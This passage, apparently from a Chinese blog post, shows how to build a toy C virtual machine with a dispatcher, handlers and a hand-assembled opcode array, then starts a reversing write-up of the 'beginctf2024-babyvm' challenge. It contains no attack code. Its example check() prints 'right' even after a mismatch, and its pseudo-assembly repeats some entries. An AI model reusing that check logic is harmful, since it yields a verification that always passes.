class="token number">0</span><span class="token punctuation">;</span>    cpu<span class="token operator">-></span>eip<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>vm_code<span class="token punctuation">;</span> <span class="token comment">//将eip指向opcode的地址</span>    cpu<span class="token operator">-></span>op_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>opcode<span class="token operator">=</span><span class="token number">0xf1</span><span class="token punctuation">;</span>    cpu<span class="token operator">-></span>op_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>handle<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>mov_<span class="token punctuation">;</span>   <span class="token comment">/*   mov：这是一个函数名，表示函数的地址。        (*)：这表示一个指针，指向一个函数。        (void *)：这表 示函数接受一个 void* 类型的参数。         void：这表示函数不返回任何值。*/</span>   <span class="token comment">//这样就可以将0xF1的操作码与对应的handle函数关联在一起了</span>   <span class="token comment">//以下同理</span>   cpu<span class="token operator">-></span>op_list<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>opcode<span class="token operator">=</span><span class="token number">0xf2</span><span class="token punctuation">;</span>   cpu<span class="token operator">-></span>op_list<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>handle<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>xor_<span class="token punctuation">;</span>   cpu<span class="token operator">-></span>op_list<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>opcode<span class="token operator">=</span><span class="token number">0xf5</span><span class="token punctuation">;</span>   cpu<span class="token operator">-></span>op_list<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>handle<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>read_<span class="token punctuation">;</span>   vm_stack<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x512</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">memset</span><span class="token punctuation">(</span>vm_stack<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x512</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="vm_start"><a class="markdownIt-Anchor" href="#vm_start"></a> vm_start</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">vm_start</span><span class="token punctuation">(</span>vm_cpu <span class="token operator">*</span>cpu<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cpu<span class="token operator">-></span>eip<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>vm_code<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>cpu<span class="token operator">-></span>eip<span class="token punctuation">)</span><span class="token operator">!=</span>RET<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">vm_dispatcher</span><span class="token punctuation">(</span>cpu<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//执行对应函数</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="vm_dispatcher"><a class="markdownIt-Anchor" href="#vm_dispatcher"></a> vm_dispatcher</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//分发器</span><span class="token keyword">void</span> <span class="token function">vm_dispatcher</span><span class="token punctuation">(</span>vm_cpu <span class="token operator">*</span>cpu<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>OPCODE_N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">*</span>cpu<span class="token operator">-></span>eip<span class="token operator">==</span>cpu<span class="token operator">-></span>op_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>opcode<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            cpu<span class="token operator">-></span>op_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">handle</span><span class="token punctuation">(</span>cpu<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="checkflag"><a class="markdownIt-Anchor" href="#checkflag"></a> checkflag</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>target<span class="token operator">=</span>vm_stack<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>F_LEN<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> offset<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span>target<span class="token punctuation">[</span>offset<span class="token punctuation">]</span><span class="token operator">!=</span>enc_flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>     <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"right"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="将伪代码转为opcode"><a class="markdownIt-Anchor" href="#将伪代码转为opcode"></a> 将伪代码转为opcode</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">&#x2F;*    call read_    MOV R1,flag[0]    XOR    MOV R1,0x20;    &#x2F;&#x2F;这是将R1的值送到vm_stack+0x20的位置，后面的同上    MOV R1,flag[1]    XOR    MOV R1,0x21;    MOV R1,flag[2]    XOR    MOV R1,0x22    MOV R1,flag[3]    XOR    MOV R1,0x23;    MOV R1,flag[4]    XOR    MOV R1,0x24;    MOV R1,flag[5]    XOR    MOV R1,0x25;    MOV R1,flag[6]    XOR    MOV R1,0x26;    MOV R1,flag[7]    XOR    MOV R1,0x26    MOV R1,flag[7]    XOR    MOV R1,0X27    MOV R1,flag[7]    XOR    MOV R1,0x28    MOV R1,flag[7]    XOR    MOV R1,0X29     MOV R1,flag[7]    XOR    MOV R1,0x2A    MOV R1,flag[7]    XOR       MOV R1,0x2b*&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后将对应的伪代码转为自定义的opcode</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">char</span> vm_code<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token number">0xf5</span><span class="token punctuation">,</span>    <span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0xf2</span><span class="token punctuation">,</span><span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0xe4</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span>    <span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0x1</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0xf2</span><span class="token punctuation">,</span><span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0xe4</span><span class="token punctuation">,</span><span class="token number">0x21</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span>    <span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0x2</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0xf2</span><span class="token punctuation">,</span><span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0xe4</span><span class="token punctuation">,</span><span class="token number">0x22</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span>    <span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0x3</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0xf2</span><span class="token punctuation">,</span><span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0xe4</span><span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span>    <span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0x4</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0xf2</span><span class="token punctuation">,</span><span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0xe4</span><span class="token punctuation">,</span><span class="token number">0x24</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span>    <span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0x5</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0xf2</span><span class="token punctuation">,</span><span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0xe4</span><span class="token punctuation">,</span><span class="token number">0x25</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span>    <span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0x6</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0xf2</span><span class="token punctuation">,</span><span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0xe4</span><span class="token punctuation">,</span><span class="token number">0x26</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span>    <span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0x7</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0xf2</span><span class="token punctuation">,</span><span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0xe4</span><span class="token punctuation">,</span><span class="token number">0x27</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span>    <span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0x8</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0xf2</span><span class="token punctuation">,</span><span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0xe4</span><span class="token punctuation">,</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span>    <span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0x9</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0xf2</span><span class="token punctuation">,</span><span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0xe4</span><span class="token punctuation">,</span><span class="token number">0x29</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span>    <span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0xa</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0xf2</span><span class="token punctuation">,</span><span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0xe4</span><span class="token punctuation">,</span><span class="token number">0x2a</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span>    <span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0xb</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0xf2</span><span class="token punctuation">,</span><span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0xe4</span><span class="token punctuation">,</span><span class="token number">0x2b</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span>    <span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0xc</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0xf2</span><span class="token punctuation">,</span><span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0xe4</span><span class="token punctuation">,</span><span class="token number">0x2c</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span>    <span class="token number">0xf4</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简易vm程序运行成功截图</p><p>41890</p><p>-------未完待续----------</p><h1 id="vm逆向"><a class="markdownIt-Anchor" href="#vm逆向"></a> vm逆向</h1><h2 id="beginctf2024-babyvm"><a class="markdownIt-Anchor" href="#beginctf2024-babyvm"></a> beginctf2024-babyvm</h2><p>给了memory.vm 与opcode.vm</p><p><strong>从opcode.vm里读取opcode，memory.vm里读取数据</strong></p><p>写一个脚本读取数据</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    FILE <span class="token operator">*</span>fp<span class="token punctuation">,</span><span class="token operator">*</span>v5<span class="token punctuation">;</span>    <span class="token keyword">int</span> n<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>c<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> a<span class="token punctuation">,</span>b<span class="token punctuation">;</span>    fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"./memory.vm"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//fp=fopen("./opcode.vm","rb");</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">feof</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        n<span class="token operator">++</span><span class="token punctuation">;</span>        a<span class="token operator">=</span><span class="token function">fgetc</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>        b<span class="token operator">=</span>a<span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x%x,"</span><span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后照着反编译的C语言把vm虚拟机要干什么打印出来</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdint.h></span><span class="token expression"><span class="token punctuation">;</span></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> opcode<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> memory<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> ep<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">uint32_t</span> a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">;</span>    a<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    b<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    c<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Memory[%x] = Memory[%x] + Memory[%x]"</span><span class="token punctuation">,</span>a<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">,</span>b<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">,</span>c<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">sub</span><span class="token punctuation">(</span><span class="token keyword">int</span> ep<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">uint32_t</span> a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">;</span>    a<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    b<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    c<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Memory[%x] = Memory[%x] - Memory[%x]"</span><span class="token punctuation">,</span>a<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">,</span>b<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">,</span>c<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">mul</span><span class="token punctuation">(</span><span class="token keyword">int</span> ep<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">uint32_t</span> a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">;</span>    a<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    b<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    c<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Memory[%x] = Memory[%x] * Memory[%x]"</span><span class="token punctuation">,</span>a<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">,</span>b<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">,</span>c<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">divide</span><span class="token punctuation">(</span><span class="token keyword">int</span> ep<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">uint32_t</span> a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">;</span>    a<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    b<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    c<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Memory[%x] = Memory[%x] / Memory[%x]"</span><span class="token punctuation">,</span>a<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">,</span>b<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">,</span>c<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">rst_in</span><span class="token punctuation">(</span><span class="token keyword">int</span> ep<span class="token punctuation">)</span><span class="token 